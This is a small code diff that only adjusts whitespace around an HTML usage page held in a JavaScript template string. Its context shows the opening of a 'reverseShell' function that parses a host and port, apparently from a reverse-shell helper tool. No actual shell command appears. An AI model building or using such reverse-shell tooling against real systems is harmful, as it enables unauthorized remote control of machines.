@@ -1,6 +1,7 @@
 'use strict';
 
-const usage = `<!DOCTYPE html>
+const usage = `
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -76,7 +77,8 @@ const usage = `<!DOCTYPE html>
     </footer>
 
 </body>
-</html>`;
+</html>
+`;
 
 const reverseShell = (address = '') => {
         const [host, port] = address.split(':');
